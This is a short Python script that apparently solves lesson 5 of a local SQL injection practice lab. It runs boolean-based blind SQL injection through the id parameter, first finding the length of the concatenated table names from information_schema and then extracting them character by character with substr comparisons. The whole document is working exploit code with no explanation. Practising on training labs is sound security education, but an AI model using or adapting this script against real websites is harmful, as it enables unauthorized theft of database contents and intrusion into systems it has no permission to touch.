import requests


url="http://localhost:8001"
lesson = "/Less-5/"

url = url + lesson

info = "(select group_concat(table_name) from information_schema.tables where table_schema = database())"

query = "length(" + info + ")="
end = " -- +"
for i in range(1000):
	params={'id':"' or " + query + str(i) + end}
	r = requests.get(url,params)
	#print(r.url)
	if "You are in" in r.text:
		tmp1 = i
		break

returnval = ""
query = "binary substr(" + info + ","
for i in range(1,tmp1 + 1):
	for j in range(48,123):
		params = {'id':"' or " + query + str(i) + ",1)='" + chr(j) + "'" + end}
		r = requests.get(url,params)
		#print(r.url)
		if "You are in" in r.text:
			returnval += chr(j)
			break
print(returnval)